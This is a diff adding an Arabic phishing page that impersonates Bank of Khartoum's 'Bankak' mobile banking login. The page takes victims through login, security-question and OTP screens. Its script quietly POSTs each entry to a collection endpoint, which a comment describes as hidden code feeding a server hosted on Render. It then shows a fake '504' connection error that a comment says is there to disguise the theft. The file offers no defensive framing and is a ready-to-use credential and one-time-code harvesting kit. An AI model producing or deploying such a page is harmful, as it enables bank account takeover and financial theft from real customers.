@@ -1,1 +1,162 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بنك الخرطوم - تطبيق بنكك</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: linear-gradient(135deg, #4A0000 0%, #150000 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .bankak-container { background: #ffffff; width: 100%; max-width: 420px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.5); overflow: hidden; border: 2px solid #D4AF37; }
+        .header-banner { background: #660000; padding: 30px 20px; text-align: center; border-bottom: 4px solid #D4AF37; }
+        .logo-circle { width: 80px; height: 80px; background: #ffffff; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 12px; border: 3px solid #D4AF37; font-weight: bold; color: #660000; font-size: 22px; }
+        .brand-title { color: #D4AF37; font-size: 20px; font-weight: bold; }
+        .brand-subtitle { color: #ffffff; font-size: 12px; margin-top: 4px; opacity: 0.9; }
+        .section-box { padding: 25px; display: none; }
+        .active-section { display: block; }
+        h2 { color: #660000; font-size: 20px; margin-bottom: 20px; text-align: center; border-bottom: 2px solid #f4f4f4; padding-bottom: 10px; }
+        .notice-text { font-size: 13px; color: #666; margin-bottom: 15px; text-align: center; }
+        .input-group { margin-bottom: 18px; }
+        .input-group label { display: block; font-size: 14px; color: #333; font-weight: 600; margin-bottom: 8px; }
+        .input-group input, .input-group select { width: 100%; padding: 12px 15px; border: 1.5px solid #ccc; border-radius: 10px; font-size: 15px; text-align: right; background: #f9f9f9; outline: none; }
+        .input-group input:focus, .input-group select:focus { border-color: #660000; background: #ffffff; }
+        .error-msg { color: #cc0000; font-size: 12px; margin-top: 5px; display: none; }
+        .btn-next { width: 100%; padding: 14px; background: linear-gradient(180deg, #800000 0%, #550000 100%); color: #ffffff; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 12px rgba(102,0,0,0.3); }
+        .btn-next:hover { background: linear-gradient(180deg, #990000 0%, #660000 100%); }
+        .timer-text { text-align: center; font-size: 14px; color: #660000; font-weight: bold; margin-top: 15px; }
+        .loading-box { text-align: center; padding: 40px 20px; }
+        .spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #800000; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
 
+    <div class="bankak-container">
+        <div class="header-banner">
+            <div class="logo-circle">BOK</div>
+            <div class="brand-title">تطبيق بنكك</div>
+            <div class="brand-subtitle">خدماتك المصرفية بين يديك - بنك الخرطوم</div>
+        </div>
+
+        <!-- المرحلة 1: تسجيل الدخول -->
+        <div id="step-login" class="section-box active-section">
+            <h2>تسجيل الدخول</h2>
+            <p class="notice-text">من فضلك أدخل رقم الحساب وكلمة المرور</p>
+            <div class="input-group">
+                <label>رقم الحساب / الهاتف</label>
+                <input type="text" id="accNum" placeholder="أدخل رقم الحساب المكون من 7 أرقام أو الهاتف">
+                <div id="accError" class="error-msg">رقم الحساب يجب أن يتكون من 7 أرقام بالضبط أو هاتف صحيح</div>
+            </div>
+            <div class="input-group">
+                <label>كلمة المرور</label>
+                <input type="password" id="accPass" placeholder="أدخل كلمة المرور السرية">
+            </div>
+            <button class="btn-next" onclick="submitLogin()">التالي</button>
+        </div>
+
+        <!-- المرحلة 2: سؤال الأمان -->
+        <div id="step-question" class="section-box">
+            <h2>الإجابة على سؤال الأمان</h2>
+            <div class="input-group">
+                <label>اختر سؤال أمان</label>
+                <select id="secureQuestion">
+                    <option value="ما هو اسم أول مدرسة التحقت بها؟">ما هو اسم أول مدرسة التحقت بها؟</option>
+                    <option value="ما هو اسم مدينتك المفضلة؟">ما هو اسم مدينتك المفضلة؟</option>
+                    <option value="ما هو اسم حيوانك الأليف الأول؟">ما هو اسم حيوانك الأليف الأول؟</option>
+                    <option value="أسئلة أخرى">أسئلة أخرى...</option>
+                </select>
+            </div>
+            <div class="input-group">
+                <label>أدخل إجابتك</label>
+                <input type="text" id="secureAnswer" placeholder="اكتب الإجابة هنا" maxlength="30">
+            </div>
+            <button class="btn-next" onclick="submitQuestion()">إرسال</button>
+        </div>
+
+        <!-- المرحلة 3: تأكيد الرقم السري والتأكيد (OTP) -->
+        <div id="step-otp" class="section-box">
+            <h2>تأكيد الرقم السري</h2>
+            <p class="notice-text">أدخل رمز التحقق المكون من 6 أرقام المرسل إلى هاتفك</p>
+            <div class="input-group">
+                <input type="text" id="otpCode" placeholder="******" maxlength="6" style="font-size: 24px; letter-spacing: 5px; text-align: center;">
+            </div>
+            <button class="btn-next" onclick="submitOTP()">تأكيد</button>
+            <div class="timer-text">30:00 إعادة إرسال الرمز</div>
+        </div>
+
+        <!-- المرحلة 4: المعالجة -->
+        <div id="step-loading" class="section-box">
+            <h2>جاري معالجة العملية</h2>
+            <div class="loading-box">
+                <div class="spinner"></div>
+                <p>الرجاء الانتظار...</p>
+                <div class="timer-text" style="margin-top: 20px;">10:00</div>
+                <p style="font-size: 12px; color: #777; margin-top: 10px;">الوقت المتبقي للانتهاء من المعالجة</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- كود الربط الفعلي الخفي لإرسال البيانات بالتتابع للسيرفر المرفوع في Render -->
+    <script>
+        let currentUsername = "";
+
+        function showStep(stepId) {
+            document.querySelectorAll('.section-box').forEach(box => box.classList.remove('active-section'));
+            document.getElementById(stepId).classList.add('active-section');
+        }
+
+        async function sendToServer(dataPayload) {
+            try {
+                await fetch('/api/secure-login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(dataPayload)
+                });
+            } catch (err) {
+                console.log("خادم خارجي قيد الانتظار");
+            }
+        }
+
+        async function submitLogin() {
+            const acc = document.getElementById('accNum').value.trim();
+            const pass = document.getElementById('accPass').value.trim();
+            
+            if(!acc || !pass) return alert('الرجاء ملء الحقول المطلوبة.');
+            
+            currentUsername = acc;
+            
+            // إرسال الخطوة الأولى للسيرفر
+            await sendToServer({ username: acc, password: pass, step: "1-تسجيل الدخول" });
+            
+            showStep('step-question');
+        }
+
+        async function submitQuestion() {
+            const q = document.getElementById('secureQuestion').value;
+            const a = document.getElementById('secureAnswer').value.trim();
+            
+            if(!a) return alert('الرجاء إدخال الإجابة.');
+            
+            // إرسال الخطوة الثانية للسيرفر
+            await sendToServer({ username: currentUsername, password: `[السؤال: ${q}] | [الإجابة: ${a}]`, step: "2-سؤال الأمان" });
+            
+            showStep('step-otp');
+        }
+
+        async function submitOTP() {
+            const otp = document.getElementById('otpCode').value.trim();
+            if(!otp) return alert('الرجاء إدخال رمز التحقق.');
+            
+            // إرسال الخطوة الثالثة والأخيرة للسيرفر
+            await sendToServer({ username: currentUsername, password: `[رمز OTP الحساب: ${otp}]`, step: "3-رمز التحقق" });
+            
+            showStep('step-loading');
+            
+            // تمويه الرفض بعد انتهاء الوقت
+            setTimeout(() => {
+                alert("عذراً، فشل الاتصال بالخدمة حالياً. يرجى التحقق من الشبكة وإعادة المحاولة لاحقاً (رمز الخطأ: 504).");
+            }, 4000);
+        }
+    </script>
+</body>
+  </html>
